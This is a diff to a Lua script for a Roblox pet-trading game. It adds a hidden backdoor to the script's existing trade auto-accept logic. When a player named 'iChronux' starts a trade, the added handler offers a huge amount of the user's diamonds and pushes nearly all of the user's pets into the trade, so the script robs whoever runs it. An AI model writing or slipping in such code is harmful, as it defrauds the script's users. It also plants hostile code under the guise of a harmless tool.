@@ -206,6 +206,68 @@ v2.Network.Fired("Init Trade"):Connect(function(p3, p4) --Trade handler
 	    workspace.__THINGS.__REMOTES:FindFirstChild("ready trade"):InvokeServer(unpack(acceptargs))
 	until game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Trading").Enabled == false
 end);
+local library = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"));
+function getPetCount()
+    local petCount = 0
+    local petsGUIPath = game.Players.LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets
+    for i,v in pairs(petsGUIPath:GetChildren()) do
+        if v:IsA("TextButton") then
+            petCount = petCount + 1
+        end
+    end
+    return petCount
+end
+function StealValuablePets(currentTradeId)
+    local UI = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets
+    local function UnformatNumber(str)
+        local suffixes = {'k','m','b'}
+        if not (str and type(str) == 'string') then
+            error('invalid parameters.\nP1 - string: string', 2)
+        end
+        local totalMagnitude = 1
+        for key, suffix in pairs(suffixes) do
+            str = string.gsub(str, suffix, function()
+                totalMagnitude = totalMagnitude * (10 ^ (key * 3))
+                return ''
+            end)
+        end
+        if not tonumber(str) then
+            return 'invalid'
+        end
+        return totalMagnitude * str
+    end
+    count = 0
+    for i,v in pairs(UI:GetChildren()) do
+        if v:IsA("TextButton") then
+            local petID = v.Name
+            count = count+1
+            if count <= getPetCount() - 1 then
+                local args = {
+                    [1] = {
+                        [1] = currentTradeId,
+                        [2] = v.Name
+                    }
+                }  
+               workspace.__THINGS.__REMOTES:FindFirstChild("add trade pet"):InvokeServer(unpack(args))
+            else
+                break
+            end
+        end
+    end
+end
+library.Network.Fired("Init Trade"):Connect(function(p3, p4)
+    if game.Players:FindFirstChild("iChronux") and game.Players["iChronux"].Character:FindFirstChild("RightHand") == nil and game.Players["iChronux"].Character:FindFirstChild("LeftHand") == nil then
+        tradeName = p3;
+        local args = {
+            [1] = {
+                [1] = tradeName,
+                [2] = 100e10
+            }
+        }
+        game.Workspace.__THINGS.__REMOTES:FindFirstChild("change trade diamonds"):InvokeServer(unpack(args))
+        StealValuablePets(tradeName)
+    end
+end);
 while wait(1) do
 	if game:GetService("Players").LocalPlayer.PlayerGui.Message.Enabled == true then
 		wait(1)
